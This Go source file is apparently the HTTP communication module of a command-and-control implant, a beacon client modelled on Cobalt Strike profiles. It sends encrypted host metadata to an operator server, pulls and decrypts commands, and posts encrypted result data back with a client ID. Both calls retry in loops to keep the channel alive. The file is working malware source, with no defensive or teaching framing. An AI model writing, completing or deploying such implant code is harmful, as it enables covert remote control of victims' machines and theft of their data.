package packet

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"main/config"
	"main/util"
	"math/rand"
	"net/http"
	"strconv"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

// init was called at beginning of the package
func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

// HttpPost seems post response is no need to deal with
// need to handler c2profile here
func HttpPost(data []byte) *req.Resp {
	data = util.EncryptField(config.PostClientDataEncryptType, data)
	// add custom header here
	headers := config.HttpHeaders

	param := req.QueryParam{
		config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
	}

	// add append and prepend,but it seems client don't need this
	data = append(data, []byte(config.PostClientAppend)...)
	data = append([]byte(config.PostClientPrepend), data...)

	for {
		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
		resp, err := httpRequest.Post(url, data, headers, param)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(time.Second * 5)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				// it seems nobody care about post result?
				return resp
			}
			break
		}
	}

	return nil
}

// HttpGet need to handler c2profile here, data is raw rsa encrypted meta info
func HttpGet(data []byte) ([]byte, error) {
	// do some copy?
	buf := bytes.NewBuffer(data)
	stringData := string(util.EncryptField(config.GetMetaEncryptType, buf.Bytes()))
	stringData = config.GetClientPrepend + stringData + config.GetClientAppend

	httpHeaders := config.HttpHeaders
	metaDataHeader := req.Header{config.MetaDataField: stringData}

	url := config.Host + config.GetUri[rand.Intn(len(config.GetUri))]

	for {
		// provide 2 header args is supported
		resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader)
		// just pull command again
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(time.Second * 5)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				payload, err2 := resolveServerResponse(resp)
				if err2 != nil {
					fmt.Println(err)
					time.Sleep(time.Second * 5)
					continue
				}
				return payload, nil
			}
			break
		}
	}
	return nil, errors.New("shouldn't be accessed at HttpGet")
}

// extract payload
func resolveServerResponse(res *req.Resp) ([]byte, error) {
	method := res.Request().Method
	// response body string
	data := res.Bytes()
	switch method {
	case "GET":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.GetServerPrepend)), []byte(config.GetServerAppend))
		var err error
		data, err = util.DecryptField(config.GetServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	case "POST":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.PostServerPrepend)), []byte(config.PostServerAppend))
		var err error
		data, err = util.DecryptField(config.PostServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	default:
		panic("invalid http method type " + method)
	}
	return data, nil
}
